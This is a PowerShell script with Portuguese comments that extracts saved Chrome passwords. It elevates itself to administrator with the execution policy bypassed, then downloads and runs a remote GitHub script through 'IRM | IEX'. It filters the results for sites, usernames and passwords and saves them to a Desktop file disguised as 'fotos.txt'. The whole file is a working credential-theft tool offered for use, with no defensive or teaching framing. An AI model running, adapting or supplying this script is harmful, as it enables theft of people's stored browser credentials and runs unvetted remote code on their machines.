# ExtrairSenhas.ps1 - Versão com salvamento automático em fotos.txt

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define o arquivo de saída fixo: fotos.txt na Área de Trabalho
$saida = Join-Path ([Environment]::GetFolderPath("Desktop")) "fotos.txt"

Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

Write-Host "Executando extração de senhas do Chrome..." -ForegroundColor Cyan

# Executa e captura a saída (agora com técnica que funciona)
$output = Invoke-PowerChrome -Browser Chrome 2>&1

# Salva APENAS as linhas que contêm as senhas (filtra a tabela)
$senhas = $output | Where-Object { 
    $_ -match "https?://" -or 
    $_ -match "@" -or 
    ($_ -match "\S+\s+\S+\s+\S+") 
}

# Se encontrou senhas, salva; senão, salva mensagem
if ($senhas.Count -gt 0) {
    # Pega o cabeçalho e as linhas de senha
    $resultado = $output | Where-Object { 
        $_ -match "Target|Username|Password|https?://" -or 
        ($_ -match "^[a-zA-Z0-9]" -and $_ -notmatch "Github|Carregando|Executando|Pronto|Pressione")
    }
    $resultado | Out-File -FilePath $saida -Encoding UTF8
    Write-Host "`n===================================================" -ForegroundColor Green
    Write-Host "Pronto! Senhas salvas em: $saida" -ForegroundColor Green
    Write-Host "===================================================" -ForegroundColor Green
} else {
    "Nenhuma senha encontrada no Chrome." | Out-File -FilePath $saida -Encoding UTF8
    Write-Host "`n===================================================" -ForegroundColor Yellow
    Write-Host "Nenhuma senha encontrada. Arquivo criado em: $saida" -ForegroundColor Yellow
    Write-Host "===================================================" -ForegroundColor Yellow
}

Write-Host "`nPressione qualquer tecla para fechar..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
